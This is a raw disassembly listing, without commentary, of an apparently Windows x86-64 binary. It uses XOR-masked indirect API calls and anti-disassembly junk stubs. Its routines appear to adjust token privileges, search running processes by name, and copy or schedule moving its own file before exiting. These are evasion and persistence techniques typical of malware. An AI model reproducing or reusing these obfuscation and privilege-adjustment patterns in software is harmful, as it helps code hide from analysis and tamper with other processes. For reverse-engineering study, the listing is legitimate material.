  401ea3:	49 89 c2             	mov    %rax,%r10
  401ea6:	4c 89 d1             	mov    %r10,%rcx
  401ea9:	4c 8b 1d 28 ab 00 00 	mov    0xab28(%rip),%r11        # 0x40c9d8
  401eb0:	48 8b 05 49 ab 00 00 	mov    0xab49(%rip),%rax        # 0x40ca00
  401eb7:	4c 33 18             	xor    (%rax),%r11
  401eba:	41 ff d3             	call   *%r11
  401ebd:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401ec1:	49 89 c2             	mov    %rax,%r10
  401ec4:	4c 89 d1             	mov    %r10,%rcx
  401ec7:	4c 8b 1d 42 ab 00 00 	mov    0xab42(%rip),%r11        # 0x40ca10
  401ece:	48 8b 05 63 ab 00 00 	mov    0xab63(%rip),%rax        # 0x40ca38
  401ed5:	4c 33 18             	xor    (%rax),%r11
  401ed8:	41 ff d3             	call   *%r11
  401edb:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401edf:	49 89 c2             	mov    %rax,%r10
  401ee2:	4c 89 d1             	mov    %r10,%rcx
  401ee5:	4c 8b 1d 5c ab 00 00 	mov    0xab5c(%rip),%r11        # 0x40ca48
  401eec:	48 8b 05 7d ab 00 00 	mov    0xab7d(%rip),%rax        # 0x40ca70
  401ef3:	4c 33 18             	xor    (%rax),%r11
  401ef6:	41 ff d3             	call   *%r11
  401ef9:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401efd:	49 89 c2             	mov    %rax,%r10
  401f00:	4c 89 d1             	mov    %r10,%rcx
  401f03:	4c 8b 1d 76 ab 00 00 	mov    0xab76(%rip),%r11        # 0x40ca80
  401f0a:	48 8b 05 97 ab 00 00 	mov    0xab97(%rip),%rax        # 0x40caa8
  401f11:	4c 33 18             	xor    (%rax),%r11
  401f14:	41 ff d3             	call   *%r11
  401f17:	b8 01 00 00 00       	mov    $0x1,%eax
  401f1c:	c9                   	leave
  401f1d:	c3                   	ret
  401f1e:	cc                   	int3
  401f1f:	cc                   	int3
  401f20:	e8 00 00 00 00       	call   0x401f25
  401f25:	48 83 c4 08          	add    $0x8,%rsp
  401f29:	c3                   	ret
  401f2a:	90                   	nop
  401f2b:	90                   	nop
  401f2c:	cc                   	int3
  401f2d:	90                   	nop
  401f2e:	eb 0b                	jmp    0x401f3b
  401f30:	48 31 c0             	xor    %rax,%rax
  401f33:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401f3a:	90                   	nop
  401f3b:	55                   	push   %rbp
  401f3c:	48 89 e5             	mov    %rsp,%rbp
  401f3f:	48 81 ec 70 00 00 00 	sub    $0x70,%rsp
  401f46:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  401f4a:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  401f4e:	48 b8 ff ff ff ff ff 	movabs $0xffffffffffffffff,%rax
  401f55:	ff ff ff 
  401f58:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  401f5c:	b8 10 00 00 00       	mov    $0x10,%eax
  401f61:	49 89 c0             	mov    %rax,%r8
  401f64:	b8 00 00 00 00       	mov    $0x0,%eax
  401f69:	49 89 c3             	mov    %rax,%r11
  401f6c:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
  401f70:	49 89 c2             	mov    %rax,%r10
  401f73:	4c 89 d1             	mov    %r10,%rcx
  401f76:	4c 89 da             	mov    %r11,%rdx
  401f79:	4c 8b 1d 98 8c 00 00 	mov    0x8c98(%rip),%r11        # 0x40ac18
  401f80:	48 8b 05 b9 8c 00 00 	mov    0x8cb9(%rip),%rax        # 0x40ac40
  401f87:	4c 33 18             	xor    (%rax),%r11
  401f8a:	41 ff d3             	call   *%r11
  401f8d:	48 8d 05 ac 70 00 00 	lea    0x70ac(%rip),%rax        # 0x409040
  401f94:	49 89 c2             	mov    %rax,%r10
  401f97:	4c 89 d1             	mov    %r10,%rcx
  401f9a:	4c 8b 1d af 8c 00 00 	mov    0x8caf(%rip),%r11        # 0x40ac50
  401fa1:	48 8b 05 d0 8c 00 00 	mov    0x8cd0(%rip),%rax        # 0x40ac78
  401fa8:	4c 33 18             	xor    (%rax),%r11
  401fab:	41 ff d3             	call   *%r11
  401fae:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  401fb2:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  401fb6:	48 83 f8 00          	cmp    $0x0,%rax
  401fba:	0f 85 0a 00 00 00    	jne    0x401fca
  401fc0:	b8 00 00 00 00       	mov    $0x0,%eax
  401fc5:	e9 3c 02 00 00       	jmp    0x402206
  401fca:	48 8d 05 91 70 00 00 	lea    0x7091(%rip),%rax        # 0x409062
  401fd1:	49 89 c3             	mov    %rax,%r11
  401fd4:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  401fd8:	49 89 c2             	mov    %rax,%r10
  401fdb:	4c 89 d1             	mov    %r10,%rcx
  401fde:	4c 89 da             	mov    %r11,%rdx
  401fe1:	4c 8b 1d a0 8c 00 00 	mov    0x8ca0(%rip),%r11        # 0x40ac88
  401fe8:	48 8b 05 c1 8c 00 00 	mov    0x8cc1(%rip),%rax        # 0x40acb0
  401fef:	4c 33 18             	xor    (%rax),%r11
  401ff2:	41 ff d3             	call   *%r11
  401ff5:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
  401ff9:	48 8d 05 7b 70 00 00 	lea    0x707b(%rip),%rax        # 0x40907b
  402000:	49 89 c3             	mov    %rax,%r11
  402003:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  402007:	49 89 c2             	mov    %rax,%r10
  40200a:	4c 89 d1             	mov    %r10,%rcx
  40200d:	4c 89 da             	mov    %r11,%rdx
  402010:	4c 8b 1d a9 8c 00 00 	mov    0x8ca9(%rip),%r11        # 0x40acc0
  402017:	48 8b 05 ca 8c 00 00 	mov    0x8cca(%rip),%rax        # 0x40ace8
  40201e:	4c 33 18             	xor    (%rax),%r11
  402021:	41 ff d3             	call   *%r11
  402024:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  402028:	48 8d 05 6a 70 00 00 	lea    0x706a(%rip),%rax        # 0x409099
  40202f:	49 89 c3             	mov    %rax,%r11
  402032:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  402036:	49 89 c2             	mov    %rax,%r10
  402039:	4c 89 d1             	mov    %r10,%rcx
  40203c:	4c 89 da             	mov    %r11,%rdx
  40203f:	4c 8b 1d b2 8c 00 00 	mov    0x8cb2(%rip),%r11        # 0x40acf8
  402046:	48 8b 05 d3 8c 00 00 	mov    0x8cd3(%rip),%rax        # 0x40ad20
  40204d:	4c 33 18             	xor    (%rax),%r11
  402050:	41 ff d3             	call   *%r11
  402053:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  402057:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  40205b:	48 83 f8 00          	cmp    $0x0,%rax
  40205f:	0f 84 1c 00 00 00    	je     0x402081
  402065:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  402069:	48 83 f8 00          	cmp    $0x0,%rax
  40206d:	0f 84 0e 00 00 00    	je     0x402081
  402073:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  402077:	48 83 f8 00          	cmp    $0x0,%rax
  40207b:	0f 85 28 00 00 00    	jne    0x4020a9
  402081:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  402085:	49 89 c2             	mov    %rax,%r10
  402088:	4c 89 d1             	mov    %r10,%rcx
  40208b:	4c 8b 1d 9e 8c 00 00 	mov    0x8c9e(%rip),%r11        # 0x40ad30
  402092:	48 8b 05 bf 8c 00 00 	mov    0x8cbf(%rip),%rax        # 0x40ad58
  402099:	4c 33 18             	xor    (%rax),%r11
  40209c:	41 ff d3             	call   *%r11
  40209f:	b8 00 00 00 00       	mov    $0x0,%eax
  4020a4:	e9 5d 01 00 00       	jmp    0x402206
  4020a9:	4c 8b 1d b8 8c 00 00 	mov    0x8cb8(%rip),%r11        # 0x40ad68
  4020b0:	48 8b 05 d9 8c 00 00 	mov    0x8cd9(%rip),%rax        # 0x40ad90
  4020b7:	4c 33 18             	xor    (%rax),%r11
  4020ba:	41 ff d3             	call   *%r11
  4020bd:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
  4020c1:	49 89 c8             	mov    %rcx,%r8
  4020c4:	b9 28 00 00 00       	mov    $0x28,%ecx
  4020c9:	49 89 cb             	mov    %rcx,%r11
  4020cc:	49 89 c2             	mov    %rax,%r10
  4020cf:	4c 89 d1             	mov    %r10,%rcx
  4020d2:	4c 89 da             	mov    %r11,%rdx
  4020d5:	4c 8b 5d d8          	mov    -0x28(%rbp),%r11
  4020d9:	41 ff d3             	call   *%r11
  4020dc:	83 f8 00             	cmp    $0x0,%eax
  4020df:	0f 85 28 00 00 00    	jne    0x40210d
  4020e5:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  4020e9:	49 89 c2             	mov    %rax,%r10
  4020ec:	4c 89 d1             	mov    %r10,%rcx
  4020ef:	4c 8b 1d aa 8c 00 00 	mov    0x8caa(%rip),%r11        # 0x40ada0
  4020f6:	48 8b 05 cb 8c 00 00 	mov    0x8ccb(%rip),%rax        # 0x40adc8
  4020fd:	4c 33 18             	xor    (%rax),%r11
  402100:	41 ff d3             	call   *%r11
  402103:	b8 00 00 00 00       	mov    $0x0,%eax
  402108:	e9 f9 00 00 00       	jmp    0x402206
  40210d:	b8 01 00 00 00       	mov    $0x1,%eax
  402112:	89 45 e8             	mov    %eax,-0x18(%rbp)
  402115:	8b 45 18             	mov    0x18(%rbp),%eax
  402118:	83 f8 00             	cmp    $0x0,%eax
  40211b:	0f 84 05 00 00 00    	je     0x402126
  402121:	e9 0a 00 00 00       	jmp    0x402130
  402126:	b8 00 00 00 00       	mov    $0x0,%eax
  40212b:	e9 05 00 00 00       	jmp    0x402135
  402130:	b8 02 00 00 00       	mov    $0x2,%eax
  402135:	89 45 f4             	mov    %eax,-0xc(%rbp)
  402138:	48 8d 45 ec          	lea    -0x14(%rbp),%rax
  40213c:	49 89 c0             	mov    %rax,%r8
  40213f:	48 8b 45 10          	mov    0x10(%rbp),%rax
  402143:	49 89 c3             	mov    %rax,%r11
  402146:	31 c0                	xor    %eax,%eax
  402148:	49 89 c2             	mov    %rax,%r10
  40214b:	4c 89 d1             	mov    %r10,%rcx
  40214e:	4c 89 da             	mov    %r11,%rdx
  402151:	4c 8b 5d d0          	mov    -0x30(%rbp),%r11
  402155:	41 ff d3             	call   *%r11
  402158:	31 c0                	xor    %eax,%eax
  40215a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  40215f:	31 c0                	xor    %eax,%eax
  402161:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  402166:	b8 10 00 00 00       	mov    $0x10,%eax
  40216b:	49 89 c1             	mov    %rax,%r9
  40216e:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
  402172:	49 89 c0             	mov    %rax,%r8
  402175:	b8 00 00 00 00       	mov    $0x0,%eax
  40217a:	49 89 c3             	mov    %rax,%r11
  40217d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402181:	49 89 c2             	mov    %rax,%r10
  402184:	4c 89 d1             	mov    %r10,%rcx
  402187:	4c 89 da             	mov    %r11,%rdx
  40218a:	4c 8b 5d c8          	mov    -0x38(%rbp),%r11
  40218e:	41 ff d3             	call   *%r11
  402191:	4c 8b 1d 40 8c 00 00 	mov    0x8c40(%rip),%r11        # 0x40add8
  402198:	48 8b 05 61 8c 00 00 	mov    0x8c61(%rip),%rax        # 0x40ae00
  40219f:	4c 33 18             	xor    (%rax),%r11
  4021a2:	41 ff d3             	call   *%r11
  4021a5:	89 45 c4             	mov    %eax,-0x3c(%rbp)
  4021a8:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4021ac:	49 89 c2             	mov    %rax,%r10
  4021af:	4c 89 d1             	mov    %r10,%rcx
  4021b2:	4c 8b 1d 57 8c 00 00 	mov    0x8c57(%rip),%r11        # 0x40ae10
  4021b9:	48 8b 05 78 8c 00 00 	mov    0x8c78(%rip),%rax        # 0x40ae38
  4021c0:	4c 33 18             	xor    (%rax),%r11
  4021c3:	41 ff d3             	call   *%r11
  4021c6:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  4021ca:	49 89 c2             	mov    %rax,%r10
  4021cd:	4c 89 d1             	mov    %r10,%rcx
  4021d0:	4c 8b 1d 71 8c 00 00 	mov    0x8c71(%rip),%r11        # 0x40ae48
  4021d7:	48 8b 05 92 8c 00 00 	mov    0x8c92(%rip),%rax        # 0x40ae70
  4021de:	4c 33 18             	xor    (%rax),%r11
  4021e1:	41 ff d3             	call   *%r11
  4021e4:	8b 45 c4             	mov    -0x3c(%rbp),%eax
  4021e7:	83 f8 00             	cmp    $0x0,%eax
  4021ea:	0f 85 05 00 00 00    	jne    0x4021f5
  4021f0:	e9 05 00 00 00       	jmp    0x4021fa
  4021f5:	e9 07 00 00 00       	jmp    0x402201
  4021fa:	b8 01 00 00 00       	mov    $0x1,%eax
  4021ff:	eb 05                	jmp    0x402206
  402201:	b8 00 00 00 00       	mov    $0x0,%eax
  402206:	c9                   	leave
  402207:	c3                   	ret
  402208:	cc                   	int3
  402209:	cc                   	int3
  40220a:	e8 00 00 00 00       	call   0x40220f
  40220f:	48 83 c4 08          	add    $0x8,%rsp
  402213:	c3                   	ret
  402214:	90                   	nop
  402215:	90                   	nop
  402216:	cc                   	int3
  402217:	90                   	nop
  402218:	eb 0b                	jmp    0x402225
  40221a:	48 31 c0             	xor    %rax,%rax
  40221d:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  402224:	90                   	nop
  402225:	55                   	push   %rbp
  402226:	48 89 e5             	mov    %rsp,%rbp
  402229:	48 81 ec 40 06 00 00 	sub    $0x640,%rsp
  402230:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  402234:	b8 5e d6 57 15       	mov    $0x1557d65e,%eax
  402239:	81 f0 56 d4 57 15    	xor    $0x1557d456,%eax
  40223f:	49 89 c0             	mov    %rax,%r8
  402242:	b8 00 00 00 00       	mov    $0x0,%eax
  402247:	49 89 c3             	mov    %rax,%r11
  40224a:	48 8d 85 f8 fd ff ff 	lea    -0x208(%rbp),%rax
  402251:	49 89 c2             	mov    %rax,%r10
  402254:	4c 89 d1             	mov    %r10,%rcx
  402257:	4c 89 da             	mov    %r11,%rdx
  40225a:	4c 8b 1d bf 9c 00 00 	mov    0x9cbf(%rip),%r11        # 0x40bf20
  402261:	48 8b 05 e0 9c 00 00 	mov    0x9ce0(%rip),%rax        # 0x40bf48
  402268:	4c 33 18             	xor    (%rax),%r11
  40226b:	41 ff d3             	call   *%r11
  40226e:	b8 08 02 00 00       	mov    $0x208,%eax
  402273:	49 89 c0             	mov    %rax,%r8
  402276:	b8 00 00 00 00       	mov    $0x0,%eax
  40227b:	49 89 c3             	mov    %rax,%r11
  40227e:	48 8d 85 f0 fb ff ff 	lea    -0x410(%rbp),%rax
  402285:	49 89 c2             	mov    %rax,%r10
  402288:	4c 89 d1             	mov    %r10,%rcx
  40228b:	4c 89 da             	mov    %r11,%rdx
  40228e:	4c 8b 1d c3 9c 00 00 	mov    0x9cc3(%rip),%r11        # 0x40bf58
  402295:	48 8b 05 e4 9c 00 00 	mov    0x9ce4(%rip),%rax        # 0x40bf80
  40229c:	4c 33 18             	xor    (%rax),%r11
  40229f:	41 ff d3             	call   *%r11
  4022a2:	b8 fd be 9b 84       	mov    $0x849bbefd,%eax
  4022a7:	81 f0 f5 bc 9b 84    	xor    $0x849bbcf5,%eax
  4022ad:	49 89 c0             	mov    %rax,%r8
  4022b0:	b8 00 00 00 00       	mov    $0x0,%eax
  4022b5:	49 89 c3             	mov    %rax,%r11
  4022b8:	48 8d 85 e8 f9 ff ff 	lea    -0x618(%rbp),%rax
  4022bf:	49 89 c2             	mov    %rax,%r10
  4022c2:	4c 89 d1             	mov    %r10,%rcx
  4022c5:	4c 89 da             	mov    %r11,%rdx
  4022c8:	4c 8b 1d c1 9c 00 00 	mov    0x9cc1(%rip),%r11        # 0x40bf90
  4022cf:	48 8b 05 e2 9c 00 00 	mov    0x9ce2(%rip),%rax        # 0x40bfb8
  4022d6:	4c 33 18             	xor    (%rax),%r11
  4022d9:	41 ff d3             	call   *%r11
  4022dc:	b8 04 01 00 00       	mov    $0x104,%eax
  4022e1:	49 89 c0             	mov    %rax,%r8
  4022e4:	48 8d 85 f8 fd ff ff 	lea    -0x208(%rbp),%rax
  4022eb:	49 89 c3             	mov    %rax,%r11
  4022ee:	31 c0                	xor    %eax,%eax
  4022f0:	49 89 c2             	mov    %rax,%r10
  4022f3:	4c 89 d1             	mov    %r10,%rcx
  4022f6:	4c 89 da             	mov    %r11,%rdx
  4022f9:	4c 8b 1d c8 9c 00 00 	mov    0x9cc8(%rip),%r11        # 0x40bfc8
  402300:	48 8b 05 e9 9c 00 00 	mov    0x9ce9(%rip),%rax        # 0x40bff0
  402307:	4c 33 18             	xor    (%rax),%r11
  40230a:	41 ff d3             	call   *%r11
  40230d:	48 8d 85 f0 fb ff ff 	lea    -0x410(%rbp),%rax
  402314:	49 89 c3             	mov    %rax,%r11
  402317:	b8 04 01 00 00       	mov    $0x104,%eax
  40231c:	49 89 c2             	mov    %rax,%r10
  40231f:	4c 89 d1             	mov    %r10,%rcx
  402322:	4c 89 da             	mov    %r11,%rdx
  402325:	4c 8b 1d d4 9c 00 00 	mov    0x9cd4(%rip),%r11        # 0x40c000
  40232c:	48 8b 05 f5 9c 00 00 	mov    0x9cf5(%rip),%rax        # 0x40c028
  402333:	4c 33 18             	xor    (%rax),%r11
  402336:	41 ff d3             	call   *%r11
  402339:	48 8d 85 e8 f9 ff ff 	lea    -0x618(%rbp),%rax
  402340:	49 89 c1             	mov    %rax,%r9
  402343:	b8 00 00 00 00       	mov    $0x0,%eax
  402348:	49 89 c0             	mov    %rax,%r8
  40234b:	48 8d 05 f6 71 00 00 	lea    0x71f6(%rip),%rax        # 0x409548
  402352:	49 89 c3             	mov    %rax,%r11
  402355:	48 8d 85 f0 fb ff ff 	lea    -0x410(%rbp),%rax
  40235c:	49 89 c2             	mov    %rax,%r10
  40235f:	4c 89 d1             	mov    %r10,%rcx
  402362:	4c 89 da             	mov    %r11,%rdx
  402365:	4c 8b 1d cc 9c 00 00 	mov    0x9ccc(%rip),%r11        # 0x40c038
  40236c:	48 8b 05 ed 9c 00 00 	mov    0x9ced(%rip),%rax        # 0x40c060
  402373:	4c 33 18             	xor    (%rax),%r11
  402376:	41 ff d3             	call   *%r11
  402379:	48 8d 85 e8 f9 ff ff 	lea    -0x618(%rbp),%rax
  402380:	49 89 c2             	mov    %rax,%r10
  402383:	4c 89 d1             	mov    %r10,%rcx
  402386:	4c 8b 1d e3 9c 00 00 	mov    0x9ce3(%rip),%r11        # 0x40c070
  40238d:	48 8b 05 04 9d 00 00 	mov    0x9d04(%rip),%rax        # 0x40c098
  402394:	4c 33 18             	xor    (%rax),%r11
  402397:	41 ff d3             	call   *%r11
  40239a:	48 8d 85 e8 f9 ff ff 	lea    -0x618(%rbp),%rax
  4023a1:	49 89 c3             	mov    %rax,%r11
  4023a4:	48 8d 85 f8 fd ff ff 	lea    -0x208(%rbp),%rax
  4023ab:	49 89 c2             	mov    %rax,%r10
  4023ae:	4c 89 d1             	mov    %r10,%rcx
  4023b1:	4c 89 da             	mov    %r11,%rdx
  4023b4:	4c 8b 1d ed 9c 00 00 	mov    0x9ced(%rip),%r11        # 0x40c0a8
  4023bb:	48 8b 05 0e 9d 00 00 	mov    0x9d0e(%rip),%rax        # 0x40c0d0
  4023c2:	4c 33 18             	xor    (%rax),%r11
  4023c5:	41 ff d3             	call   *%r11
  4023c8:	b8 04 00 00 00       	mov    $0x4,%eax
  4023cd:	49 89 c0             	mov    %rax,%r8
  4023d0:	31 c0                	xor    %eax,%eax
  4023d2:	49 89 c3             	mov    %rax,%r11
  4023d5:	48 8d 85 e8 f9 ff ff 	lea    -0x618(%rbp),%rax
  4023dc:	49 89 c2             	mov    %rax,%r10
  4023df:	4c 89 d1             	mov    %r10,%rcx
  4023e2:	4c 89 da             	mov    %r11,%rdx
  4023e5:	4c 8b 1d f4 9c 00 00 	mov    0x9cf4(%rip),%r11        # 0x40c0e0
  4023ec:	48 8b 05 15 9d 00 00 	mov    0x9d15(%rip),%rax        # 0x40c108
  4023f3:	4c 33 18             	xor    (%rax),%r11
  4023f6:	41 ff d3             	call   *%r11
  4023f9:	b8 00 00 00 00       	mov    $0x0,%eax
  4023fe:	49 89 c2             	mov    %rax,%r10
  402401:	4c 89 d1             	mov    %r10,%rcx
  402404:	4c 8b 1d 0d 9d 00 00 	mov    0x9d0d(%rip),%r11        # 0x40c118
  40240b:	48 8b 05 2e 9d 00 00 	mov    0x9d2e(%rip),%rax        # 0x40c140
  402412:	4c 33 18             	xor    (%rax),%r11
  402415:	41 ff d3             	call   *%r11
  402418:	c9                   	leave
  402419:	c3                   	ret
  40241a:	cc                   	int3
  40241b:	cc                   	int3
  40241c:	e8 00 00 00 00       	call   0x402421
  402421:	48 83 c4 08          	add    $0x8,%rsp
  402425:	c3                   	ret
  402426:	90                   	nop
  402427:	90                   	nop
  402428:	cc                   	int3
  402429:	90                   	nop
  40242a:	eb 0b                	jmp    0x402437
  40242c:	48 31 c0             	xor    %rax,%rax
  40242f:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  402436:	90                   	nop
  402437:	55                   	push   %rbp
  402438:	48 89 e5             	mov    %rsp,%rbp
  40243b:	48 81 ec 40 00 00 00 	sub    $0x40,%rsp
  402442:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  402446:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  40244a:	b8 00 00 00 00       	mov    $0x0,%eax
  40244f:	89 45 fc             	mov    %eax,-0x4(%rbp)
  402452:	b8 00 00 00 00       	mov    $0x0,%eax
  402457:	49 89 c3             	mov    %rax,%r11
  40245a:	b8 02 00 00 00       	mov    $0x2,%eax
  40245f:	49 89 c2             	mov    %rax,%r10
  402462:	4c 89 d1             	mov    %r10,%rcx
  402465:	4c 89 da             	mov    %r11,%rdx
  402468:	4c 8b 1d 71 80 00 00 	mov    0x8071(%rip),%r11        # 0x40a4e0
  40246f:	48 8b 05 92 80 00 00 	mov    0x8092(%rip),%rax        # 0x40a508
  402476:	4c 33 18             	xor    (%rax),%r11
  402479:	41 ff d3             	call   *%r11
  40247c:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  402480:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  402484:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
  402488:	0f 85 0a 00 00 00    	jne    0x402498
  40248e:	b8 00 00 00 00       	mov    $0x0,%eax
  402493:	e9 90 01 00 00       	jmp    0x402628
  402498:	4c 8b 1d 79 80 00 00 	mov    0x8079(%rip),%r11        # 0x40a518
  40249f:	48 8b 05 9a 80 00 00 	mov    0x809a(%rip),%rax        # 0x40a540
  4024a6:	4c 33 18             	xor    (%rax),%r11
  4024a9:	41 ff d3             	call   *%r11
  4024ac:	b9 38 02 00 00       	mov    $0x238,%ecx
  4024b1:	49 89 c8             	mov    %rcx,%r8
  4024b4:	b9 08 00 00 00       	mov    $0x8,%ecx
  4024b9:	49 89 cb             	mov    %rcx,%r11
  4024bc:	49 89 c2             	mov    %rax,%r10
  4024bf:	4c 89 d1             	mov    %r10,%rcx
  4024c2:	4c 89 da             	mov    %r11,%rdx
  4024c5:	4c 8b 1d 84 80 00 00 	mov    0x8084(%rip),%r11        # 0x40a550
  4024cc:	48 8b 05 a5 80 00 00 	mov    0x80a5(%rip),%rax        # 0x40a578
  4024d3:	4c 33 18             	xor    (%rax),%r11
  4024d6:	41 ff d3             	call   *%r11
  4024d9:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  4024dd:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  4024e1:	48 83 f8 00          	cmp    $0x0,%rax
  4024e5:	0f 85 28 00 00 00    	jne    0x402513
  4024eb:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4024ef:	49 89 c2             	mov    %rax,%r10
  4024f2:	4c 89 d1             	mov    %r10,%rcx
  4024f5:	4c 8b 1d 8c 80 00 00 	mov    0x808c(%rip),%r11        # 0x40a588
  4024fc:	48 8b 05 ad 80 00 00 	mov    0x80ad(%rip),%rax        # 0x40a5b0
  402503:	4c 33 18             	xor    (%rax),%r11
  402506:	41 ff d3             	call   *%r11
  402509:	b8 00 00 00 00       	mov    $0x0,%eax
  40250e:	e9 15 01 00 00       	jmp    0x402628
  402513:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402517:	b9 38 02 00 00       	mov    $0x238,%ecx
  40251c:	89 08                	mov    %ecx,(%rax)
  40251e:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402522:	49 89 c3             	mov    %rax,%r11
  402525:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  402529:	49 89 c2             	mov    %rax,%r10
  40252c:	4c 89 d1             	mov    %r10,%rcx
  40252f:	4c 89 da             	mov    %r11,%rdx
  402532:	4c 8b 1d 87 80 00 00 	mov    0x8087(%rip),%r11        # 0x40a5c0
  402539:	48 8b 05 a8 80 00 00 	mov    0x80a8(%rip),%rax        # 0x40a5e8
  402540:	4c 33 18             	xor    (%rax),%r11
  402543:	41 ff d3             	call   *%r11
  402546:	83 f8 00             	cmp    $0x0,%eax
  402549:	0f 84 78 00 00 00    	je     0x4025c7
  40254f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402553:	48 83 c0 2c          	add    $0x2c,%rax
  402557:	49 89 c3             	mov    %rax,%r11
  40255a:	48 8b 45 18          	mov    0x18(%rbp),%rax
  40255e:	49 89 c2             	mov    %rax,%r10
  402561:	4c 89 d1             	mov    %r10,%rcx
  402564:	4c 89 da             	mov    %r11,%rdx
  402567:	4c 8b 1d 8a 80 00 00 	mov    0x808a(%rip),%r11        # 0x40a5f8
  40256e:	48 8b 05 ab 80 00 00 	mov    0x80ab(%rip),%rax        # 0x40a620
  402575:	4c 33 18             	xor    (%rax),%r11
  402578:	41 ff d3             	call   *%r11
  40257b:	83 f8 00             	cmp    $0x0,%eax
  40257e:	0f 85 12 00 00 00    	jne    0x402596
  402584:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402588:	48 83 c0 08          	add    $0x8,%rax
  40258c:	8b 00                	mov    (%rax),%eax
  40258e:	89 45 fc             	mov    %eax,-0x4(%rbp)
  402591:	e9 31 00 00 00       	jmp    0x4025c7
  402596:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  40259a:	49 89 c3             	mov    %rax,%r11
  40259d:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4025a1:	49 89 c2             	mov    %rax,%r10
  4025a4:	4c 89 d1             	mov    %r10,%rcx
  4025a7:	4c 89 da             	mov    %r11,%rdx
  4025aa:	4c 8b 1d 7f 80 00 00 	mov    0x807f(%rip),%r11        # 0x40a630
  4025b1:	48 8b 05 a0 80 00 00 	mov    0x80a0(%rip),%rax        # 0x40a658
  4025b8:	4c 33 18             	xor    (%rax),%r11
  4025bb:	41 ff d3             	call   *%r11
  4025be:	83 f8 00             	cmp    $0x0,%eax
  4025c1:	0f 85 88 ff ff ff    	jne    0x40254f
  4025c7:	4c 8b 1d 9a 80 00 00 	mov    0x809a(%rip),%r11        # 0x40a668
  4025ce:	48 8b 05 bb 80 00 00 	mov    0x80bb(%rip),%rax        # 0x40a690
  4025d5:	4c 33 18             	xor    (%rax),%r11
  4025d8:	41 ff d3             	call   *%r11
  4025db:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
  4025df:	49 89 c8             	mov    %rcx,%r8
  4025e2:	b9 00 00 00 00       	mov    $0x0,%ecx
  4025e7:	49 89 cb             	mov    %rcx,%r11
  4025ea:	49 89 c2             	mov    %rax,%r10
  4025ed:	4c 89 d1             	mov    %r10,%rcx
  4025f0:	4c 89 da             	mov    %r11,%rdx
  4025f3:	4c 8b 1d a6 80 00 00 	mov    0x80a6(%rip),%r11        # 0x40a6a0
  4025fa:	48 8b 05 c7 80 00 00 	mov    0x80c7(%rip),%rax        # 0x40a6c8
  402601:	4c 33 18             	xor    (%rax),%r11
  402604:	41 ff d3             	call   *%r11
  402607:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  40260b:	49 89 c2             	mov    %rax,%r10
  40260e:	4c 89 d1             	mov    %r10,%rcx
  402611:	4c 8b 1d c0 80 00 00 	mov    0x80c0(%rip),%r11        # 0x40a6d8
  402618:	48 8b 05 e1 80 00 00 	mov    0x80e1(%rip),%rax        # 0x40a700
  40261f:	4c 33 18             	xor    (%rax),%r11
  402622:	41 ff d3             	call   *%r11
  402625:	8b 45 fc             	mov    -0x4(%rbp),%eax
  402628:	c9                   	leave
  402629:	c3                   	ret
  40262a:	cc                   	int3
  40262b:	cc                   	int3
  40262c:	e8 00 00 00 00       	call   0x402631
  402631:	48 83 c4 08          	add    $0x8,%rsp
  402635:	c3                   	ret
  402636:	90                   	nop
  402637:	90                   	nop
  402638:	cc                   	int3
  402639:	90                   	nop
  40263a:	eb 0b                	jmp    0x402647
  40263c:	48 31 c0             	xor    %rax,%rax
  40263f:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  402646:	90                   	nop
  402647:	55                   	push   %rbp
  402648:	48 89 e5             	mov    %rsp,%rbp
  40264b:	48 81 ec 20 00 00 00 	sub    $0x20,%rsp
  402652:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  402656:	0f b6 45 10          	movzbl 0x10(%rbp),%eax
  40265a:	83 f0 ff             	xor    $0xffffffff,%eax
  40265d:	0f b6 4d 10          	movzbl 0x10(%rbp),%ecx
  402661:	c1 e1 03             	shl    $0x3,%ecx
